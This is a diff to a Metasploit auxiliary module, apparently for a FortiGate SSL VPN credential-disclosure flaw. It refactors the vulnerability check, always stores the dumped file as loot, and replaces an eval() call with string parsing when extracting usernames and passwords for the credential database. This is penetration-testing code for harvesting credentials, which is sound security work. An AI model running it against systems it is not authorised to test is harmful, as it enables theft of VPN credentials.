@@ -39,7 +39,6 @@ class MetasploitModule < Msf::Auxiliary
     register_options([
       OptEnum.new('DUMP_FORMAT', [true,  'Dump format.', 'raw', ['raw', 'ascii']]),
       OptBool.new('STORE_CRED', [false, 'Store credential into the database.', true]),
-      OptBool.new('STORE_LOOT', [false, 'Store dump in loot.', true]),
       OptString.new('TARGETURI', [true, 'Base path', '/remote'])
     ])
   end
@@ -62,20 +61,24 @@ class MetasploitModule < Msf::Auxiliary
       return nil
     end
 
-    if response && response.code == 200
-      if response.body =~ /var fgt_lang/
-        print_good(message('Vulnerable!'))
+    unless response
+      print_error(message('No reply.'))
+      return nil
+    end
 
-        report_vuln(
-          host: @ip_address,
-          name: name,
-          refs: references,
-        )
+    if response.code != 200
+      print_error(message('NOT vulnerable!'))
+      return nil
+    end
 
-        return response.body if datastore['STORE_CRED'] == true
-      end
-    elsif response && response.code == 404
-      print_error(message('NOT Vulnerable!'))
+    if response.body =~ /var fgt_lang/
+      print_good(message('Vulnerable!'))
+      report_vuln(
+        host: @ip_address,
+        name: name,
+        refs: references,
+      )
+      return response.body if datastore['STORE_CRED'] == true
     end
 
     return nil
@@ -108,13 +111,14 @@ class MetasploitModule < Msf::Auxiliary
 
   def report_creds(creds)
     creds.each do |cred|
-      cred = eval(cred)
+      cred = cred.gsub('"', '').gsub(/[{}:]/,'').split(', ').map{|h| h1,h2 = h.split('=>'); {h1 => h2}}.reduce(:merge)
+      cred = JSON.parse(cred.to_json)
 
-      if !cred[:user].blank? && !cred[:password].blank?
+      if !cred['user'].blank? && !cred['password'].blank?
         service_data = {
-          address: cred[:ip],
-          port: cred[:port],
-          service_name: cred[:service_name],
+          address: cred['ip'],
+          port: cred['port'],
+          service_name: cred['service_name'],
           protocol: 'tcp',
           workspace_id: myworkspace_id
         }
@@ -122,8 +126,8 @@ class MetasploitModule < Msf::Auxiliary
         credential_data = {
           origin_type: :service,
           module_fullname: fullname,
-          username: cred[:user],
-          private_data: cred[:password],
+          username: cred['user'],
+          private_data: cred['password'],
           private_type: :password
         }.merge(service_data)
 
@@ -134,7 +138,6 @@ class MetasploitModule < Msf::Auxiliary
 
         create_credential_login(login_data)
       end
-
     end
   end
 
@@ -144,18 +147,21 @@ class MetasploitModule < Msf::Auxiliary
 
     print_status(message('Trying to connect.'))
     data = execute_request
-    if !data.nil?
-      if datastore['STORE_LOOT']
-        case datastore['DUMP_FORMAT']
-        when /ascii/
-          loot_data = data.gsub(/[^[:print:]]/, '.')
-        else
-          loot_data = data
-        end
-        loot_path = store_loot('', 'text/plain', @ip_address, loot_data, '', '')
-        print_good(message("File saved to #{loot_path}"))
-      end
+    if data.nil?
+      print_error(message('No data received.'))
+      return
+    end
 
+    case datastore['DUMP_FORMAT']
+    when /ascii/
+      loot_data = data.gsub(/[^[:print:]]/, '.')
+    else
+      loot_data = data
+    end
+    loot_path = store_loot('', 'text/plain', @ip_address, loot_data, '', '')
+    print_good(message("File saved to #{loot_path}"))
+
+    if data.length > 110
       if data[72..73] == "\x5F\x01"
         io = StringIO.new(data[74..-1])
       elsif data[104..109] == "\x5F\x00\x00\x00\x00\x01"
@@ -174,7 +180,9 @@ class MetasploitModule < Msf::Auxiliary
         print_error(message('No credential(s) found!'))
         return
       end
+    end
 
+    if creds.length > 0
       print_good(message("#{creds.length} credential(s) found!"))
       report_creds(creds)
     end
